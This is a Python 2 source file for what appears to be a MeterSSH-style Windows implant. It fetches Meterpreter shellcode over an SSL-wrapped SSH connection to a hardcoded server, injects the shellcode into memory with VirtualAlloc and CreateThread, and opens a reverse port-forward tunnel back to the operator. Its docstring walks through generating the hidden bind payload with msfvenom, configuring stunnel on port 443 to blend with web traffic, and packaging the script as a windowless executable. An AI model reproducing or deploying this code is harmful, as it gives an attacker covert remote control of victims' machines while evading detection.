import paramiko
import multiprocessing
import time
import subprocess
import ctypes
import thread
import threading
import select
import socket
import ssl

# all props goes to rel1k for meterssh!!
"""
Install all of this to get started, I did it on Win8.1 64 but any version should work.

# Install python 2.7 x32 "python 3 or x64 wont work"
https://www.python.org/downloads/release/python-2710/ 
# Install Microsoft Visual C++ 9.0
http://www.microsoft.com/en-us/download/confirmation.aspx?id=44266
# Upgrade pip to the latest
pip install --upgrade pip
# Install paramiko
pip install paramiko
# Install pyinstaller
pip install pyinstaller
# Pywin32 grab the correct version aka 2.7 for 32bit
http://sourceforge.net/projects/pywin32/files/pywin32/


##################################################################################
First things first you will need stunnel on the server to get this to work, 
stunnel can be a little tricky but just follow these steps to make it painless.

# This is the config _ just copy/paste
echo '[ssh_meter]
accept = 443
connect = 127.0.0.1:22
cert = /etc/stunnel/stunnel.pem' > /etc/stunnel/stunnel.conf

# Generate the certificate
openssl genrsa -out key.pem 4096
openssl req -new -x509 -key key.pem -out cert.pem -days 100
cat key.pem cert.pem >> /etc/stunnel/stunnel.pem

# Launch stunnel
# change enabled to 1 in /etc/default/stunnel4 then
/etc/init.d/stunnel4 start

Now we will need to generate our shellcode, make sure you clean it up
you can change the location later in the script if you like i use /tmp/shellcode

# bind_hidden_tcp **stays hidden from netstat till we connect to it**
msfvenom -p windows/meterpreter/bind_hidden_tcp AHOST=127.0.0.1 LPORT=8021 -f c > /tmp/scode

# this just cleans up the output its a mess but faster than editing by hand!!
# basically remove everything but the hex data
cat /tmp/scode | sed 's/"//g' | sed ':a;N;$!ba;s/\n//g' | sed 's/;//g' | sed 's/unsigned char buf\[\] = //g' > /tmp/scode_clean

# base64 it, there was a reason for this but i cant remember
cat /tmp/scode_clean | base64 - > /tmp/shellcode 

# The basic operation is this, your python exe will connect via ssl to your server on port 443
# stunnel will decrypt the traffic and forward it to our local ssh server "this can be remote"
# using paramiko we will login via ssh through the ssl socket then grab the shellcode and run
|-----SSL-----|
<-SSH-SSH-SSH->
~~~~~METER~~~~~
<-SSH-SSH-SSH->
|-----SSL-----|


https://mborgerson.com/creating-an-executable-from-a-python-script
pyinstaller.exe --onefile --windowed --icon=app.ico app.py

# TODO: hash the shellcode
# we need some error handling, check if ssh is connected every 30min and reconnect
# can we load shellcode more than once??

# Also it should be noted that you can use a valid website sll certificate 
# have a normal site running and then stunnel in the background 
# forwarding everything to another server ... and there is nothing to say you cant hop around more
# i.e. stunnel to stunnel, ssh tunnels and local/remote forwards

# line 234 in p*/transport ;)
"""

uname = 'sshuser'
upass = 'sshpw'
host = '192.168.1.37'
port = 443
iforwar = '127.0.0.1'
pforwar = 8021

#On python 3.* this wont work if you know how to fix please inform me!

def inject(shellcode):
    # special thanks to Debasish Mandal (http://www.debasish.in/2012_04_01_archive.html)
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),ctypes.c_int(len(shellcode)))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))


def connect_try():
	#the socket connection
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# wrap it in ssl, we can harden this fyi!
		s = ssl.wrap_socket(s,cert_reqs=ssl.CERT_NONE)
		s.connect((host, port))
	except Exception, e:
		print "Cant make a tcp connection to server"
		print e
	
	try:
		# Using paramiko to connect to ssh, it can be a little tricky/flakey sometimes!
		t = paramiko.Transport(s)
		t.start_client()
		# password auth done like this
		t.auth_password(uname, upass)
		# key auth is like so
		# rsa_key = """----SNIP----"""
		# pkey = paramiko.RSAKey.from_private_key(StringIO.StringIO(rsa_key))
		# t.auth_publickey(uname, pkey)
	except Exception, e:
		print "Issue with paramiko or ssh server"
	return t

	
def get_shellcode(t):
	# this is how we pull the shellcode from the server located in tmp
	com = 'cat /tmp/shellcode'
	# this opens a channel to write commands in
	chan = t.open_channel("session")
	chan.exec_command(com)
	scode = ''
	# sleep here to give recv_ready a chance to work
	time.sleep(2)
	while chan.recv_ready():
		scode += chan.recv(1024)
	chan.close()
	#remove the b64 encoding
	scode = scode.decode('base64')
	scode = scode.strip()
	return scode
	


def handler(chan, host, port):
    # python "Gender Bender" ... its a beautiful thing ... really!
    sock = socket.socket()
    try:
        sock.connect((host, port))
    except Exception as e:
        print 'Forwarding request to %s:%d failed: %r' % (host, port, e)
        return
	
    while True:
        r, w, x = select.select([sock, chan], [], [])
        if sock in r:
            data = sock.recv(1024)
            if len(data) == 0:
                break
            chan.send(data)
        if chan in r:
            data = chan.recv(1024)
            if len(data) == 0:
                break
            sock.send(data)
    chan.close()
    sock.close()


def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):
    # we set up the reverse tunnel here
    transport.request_port_forward('127.0.0.1', server_port)
    while True:
	# this will listen for first channel to open
	# i.e. first connect to port on server side
        chan = transport.accept(1000)
        if chan is None:
            continue
	#thread for starting the "Gender Bender"
        thr = threading.Thread(target=handler, args=(chan, remote_host, remote_port))
        thr.setDaemon(True)
        thr.start()

if __name__ == '__main__':
	#def deploy_shell():
	multiprocessing.freeze_support()
	# connect first and get shellcode
	con = connect_try()
	scode = get_shellcode(con)
	shellcode = scode.decode("string_escape")
	shellcode = bytearray(shellcode)
	time.sleep(2)
	# start a new process to inject shellcode
	p = multiprocessing.Process(target=inject, args=(shellcode,))
	jobs = []
	jobs.append(p)
	p.start()
	# set up the tunnel
	aa = threading.Thread(target=reverse_forward_tunnel, args=(pforwar, iforwar, pforwar, con))
	aa.setDaemon(True)
	aa.start()
	#needed or if we compile with -w it will leave a open window
	print("")
	
